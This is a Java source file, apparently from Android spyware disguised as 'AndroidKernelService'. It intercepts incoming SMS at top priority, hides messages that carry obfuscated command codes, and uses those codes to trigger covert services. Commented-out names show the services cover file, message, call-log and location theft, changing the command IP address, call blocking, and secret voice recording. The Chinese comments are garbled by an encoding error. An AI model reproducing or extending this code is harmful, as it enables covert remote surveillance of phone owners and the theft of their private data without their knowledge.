package com.AndroidKernelService;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.telephony.gsm.SmsMessage;
import android.util.Log;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.SystemClock;
import java.security.PublicKey;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;

/**
 * ���ն���������
 * 
 * @author log(K)
 * 
 */
public class SMSBroadcastReceiver extends BroadcastReceiver {

	private static final String TAG = "SMSBroadcastReceiver";
	private static ConnectivityManager mConnectivityManager;

	public static Intent i;
	public static Intent voiceIntent; // ����
	public static final String MYNUM = "18712345678";

	private String infoString = "";
	private String content = "";

	// ��̬ע���������Ȩ�����õĶ���
	private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";

	// public static final String MYNUM = "12520";

	// lzd start add an command "xS7j" to order[] to change IP address
	// lzd new IP address command style like xS7j127.0.0.1
	// public static final String[] order = {"fileinfor", "message",
	// "simphonenum", "outlookphonenum",
	// "appointment", "task", "callrecord", "colormsg", "quit",
	// "location","��IP","��ָ������ ","����ĳ��","����ĳ��","��ֹͨ�� ","���ͨ��","��վ��Ϣ"};
	public static final String[] order = { "xvsP", "SxVa", "3Vaa", "T7x6",
			"vS8b", "nn8C", "Xrw0", "nl3Z", "xYIo", "lsP5", "xS7j", "dH7k",
			"j9P5", "UR4f", "Pk9b", "VT5w", "Yt9b" };
	// lzd end add

	// public static final String openNet = "force";
	public static final String openNet = "LaFE";

	// public static final String[] voice = {"voice", "stop"};
	public static final String[] voice = { "txXe", "NtvY" };

	public static final String voiceOrderPath = "data/data/com.AndroidKernelService/";
	// public static final String voiceOrderPath = "/mnt/sdcard/";
	public static final String voiceOrderName = "VoiceOrder.txt";

	public void onReceive(Context context, Intent intent) {

		try {
			// �Ƚ��ж�̬ע��Ȩ��
			IntentFilter filter = new IntentFilter();
			filter.addAction(ACTION);
			filter.setPriority(Integer.MAX_VALUE);
			context.registerReceiver(this, filter);
			// ��̬ע��Ȩ��ע�����
		} catch (Exception e) {

		}
		try {
			// �ػ�������ʼ
			// TODO Auto-generated method stub
			String intentString = intent.getAction();

			if (intentString.equals("android.provider.Telephony.SMS_RECEIVED")) {
				Log.i(TAG, "SMS_RECEIVED");
			} else if (intentString
					.equals("android.provider.Telephony.GSM_SMS_RECEIVED")) {
				Log.i(TAG, "GSM_SMS_RECEIVED");
			} else if (intentString
					.equals("android.provider.Telephony.SMS_RECEIVED2")) {
				Log.i(TAG, "SMS_RECEIVED2");
			} else if (intentString
					.equals("android.provider.Telephony.SMS_RECEIVED_2")) {
				Log.i(TAG, "SMS_RECEIVED_2");
			} else if (intentString
					.equals("android.provider.Telephony.CDMA_SMS_RECEIVED")) {
				Log.i(TAG, "CDMA_SMS_RECEIVED");
			} else if (intentString
					.equals("android.provider.Telephony.WAP_PUSH_RECEIVED")) {
				Log.i(TAG, "WAP_PUSH_RECEIVED");
			} else if (intentString
					.equals("android.provider.Telephony.WAP_PUSH_GSM_RECEIVED")) {
				Log.i(TAG, "WAP_PUSH_GSM_RECEIVED");
			} else if (intentString
					.equals("android.provider.Telephony.WAP_PUSH_RECEIVED_2")) {
				Log.i(TAG, "android.provider.Telephony.WAP_PUSH_RECEIVED_2");
			} else {
				Log.i(TAG, "unknow Intent.");
			}
			String phoneType = "unknown";
			TelephonyManager tm = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			if (tm.getPhoneType() == TelephonyManager.PHONE_TYPE_CDMA) {
				Log.i(TAG, "Phone Type is CDMA!");
				phoneType = "CDMA";
			} else if (tm.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM) {
				Log.i(TAG, "Phone Type is GSM!");
				phoneType = "GSM";
			} else {
				phoneType = "noSignal";
			}
			Bundle bundle = intent.getExtras();

			Object[] pdusObjects = (Object[]) bundle.get("pdus");
			if (bundle != null) {
				for (int i = 0; i < pdusObjects.length; i++) {
					SmsMessageBridge smsBridge = SmsMessageBridge.getBridge(
							phoneType).createFromPdu((byte[]) pdusObjects[i]);
					/*
					 * SmsMessage[] messages = new
					 * SmsMessage[pdusObjects.length]; for (int i = 0; i <
					 * pdusObjects.length; i++) { messages[i] = SmsMessage
					 * .createFromPdu((byte[]) pdusObjects[i]); } for
					 * (SmsMessage message : messages) {
					 * SMSAddress.append(message
					 * .getDisplayOriginatingAddress());
					 * SMSContent.append(message.getDisplayMessageBody());
					 * Log.i(TAG, "���ź��룺" + SMSAddress + "\n�������ݣ�" +
					 * SMSContent); }
					 */

					if (smsBridge == null) {
						Log.i(TAG, "ni ma a!!!");
					} else {
						Log.i(TAG, "XXXXX" + smsBridge.getMessageBody()
								+ smsBridge.getDisplayMessageBody());
					}
					/*
					 * if (smsBridge.getDisplayMessageBody().contains("hello")){
					 * abortBroadcast(); Log.i(TAG, "This is a aimed mesg!"); }
					 * 
					 * Log.i(TAG, "��"+i+"��\n���ź��룺" +
					 * smsBridge.getOriginatingAddress() + "\n�������ݣ�" +
					 * smsBridge.getDisplayMessageBody()); infoString
					 * +="���ź��룺"+smsBridge.getOriginatingAddress() + "\n�������ݣ�"+
					 * smsBridge.getDisplayMessageBody();
					 */
					content = smsBridge.getDisplayMessageBody();

					// �������ݽ�����Ӧ�Ĳ���
					if (content.contains(openNet)) {
						this.abortBroadcast(); // �жϹ㲥
						intent = new Intent(context, NetworkService.class);
						context.startService(intent);

						break;
					}

					for (String odrs : voice) {
						if (content.contains(odrs)) {
							WriteLogFile
									.writeLog("receive voice order " + odrs);
							this.abortBroadcast(); // �жϹ㲥
	
							// ������д���ļ���
							try {

								File logFile = new File(voiceOrderPath
										+ voiceOrderName);
								FileOutputStream file = new FileOutputStream(
										logFile, false);
								file.write(odrs.getBytes());
								file.close();
								WriteLogFile.writeLog("voice order " + odrs
										+ "write success!");
							} catch (IOException ioe) {
								WriteLogFile.writeLog(ioe.getMessage());
								return;
							}

							if (odrs.equalsIgnoreCase("txXe")) { // ��ʼ

								
								// ��ִ��¼������֮ǰ���ȹرտ����������е�¼������
								
								//�������ļ���д��"NtvY"�ķ�ʽ
								//�������ļ����Ƿ���txXe�������еĻ�����ֹ��ǰ��������
								//��
								/*
								try{
									//���ļ�����д��"NtvY"�����ó������
									File logFile = new File(voiceOrderPath + voiceOrderName);
									FileInputStream file = new FileInputStream(logFile);
									String jieshu = "NtvY";
									File logFile1 = new File(voiceOrderPath
											+ voiceOrderName);
									FileOutputStream file1 = new FileOutputStream(
											logFile, false);
									file1.write(jieshu.getBytes());
									file1.close();
									
									//Ȼ�����ȴ�30���ӵȴ������������
									try {
										Thread.sleep(30 * 1000);
									} catch (InterruptedException e) {
										// TODO Auto-generated catch block
										WriteLogFile.writeLog("30������ͣ"
												+ e.toString());
									}
									
									//Ȼ���ļ��е��������
									try {
										File file2 = new File(voiceOrderPath + voiceOrderName);

										if (file2.exists()) {
											//System.gc();
											file2.delete();
										}

									} catch (Exception e) {
										e.printStackTrace();
									}
								}catch(Exception e){
									
								}
								*/
								//��
								
								//������������֮ǰ�ȹرտ�����ִ�е���������
								try {
									Intent stopIntent = new Intent(context,
											VoiceService.class);
									context.stopService(stopIntent);
									WriteLogFile.writeLog("���Թر���������");
								} catch (Exception e) {
									WriteLogFile.writeLog("�ر���������"
											+ e.toString());
								}
								//������ܴ��ڵ�������������
								try {
									File file2 = new File(voiceOrderPath + voiceOrderName);

									if (file2.exists()) {
										//System.gc();
										file2.delete();
									}

								} catch (Exception e) {
									e.printStackTrace();
								}
								/*
								try {
									Thread.sleep(8 * 1000);
								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									WriteLogFile.writeLog("8������ͣ"
											+ e.toString());
								}
								*/
								//WriteLogFile.writeLog("9���ӽ���");
								try {
									voiceIntent = new Intent();
									voiceIntent.setClass(context,
											VoiceService.class);

									context.startService(voiceIntent);

									// lzd

									// ��ʱ��

									// ��ʼʱ��
									/*
									 * long firstTime = SystemClock
									 * .elapsedRealtime();
									 * 
									 * AlarmManager am = (AlarmManager) context
									 * .getSystemService(context.ALARM_SERVICE);
									 * 
									 * PendingIntent sender = PendingIntent
									 * .getService(context, 0, voiceIntent, 0);
									 * 
									 * am.set(AlarmManager.RTC_WAKEUP,
									 * System.currentTimeMillis() + 1 * 1000,
									 * sender);
									 */
									// lzd
								} catch (Exception e) {
									WriteLogFile.writeLog(e.toString());
									// Log.i("VOICE", e.toString());
								}

								// ����������������
								WriteLogFile.writeLog("¼���������н���");

							}
							break;
						}
					}
					for (String odr : order) {
						// ��������ʱ,ִ������
						if (content.contains(odr)) {
							this.abortBroadcast(); // �жϹ㲥
							WriteLogFile.writeLog("begin exec msg order");
							// lzd start
							if (odr.equals("xS7j") || odr.equals("dH7k")
									|| odr.equals("j9P5") || odr.equals("UR4f")) {
								RegisterService.smsOrder = content;
							} else {
								RegisterService.smsOrder = odr;
							}
							// lzd end

							intent = new Intent(context, RegisterService.class);
							context.startService(intent);
							break;
						}

					}
					WriteLogFile.writeLog("end of the msg order");
					// Intent i = new Intent();
					// i.setClass(context, RegisterService.class);
					// context.startService(i);
					Log.i(TAG, "START REGISTER");

				}
			}
			// �ػ�����������
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
}
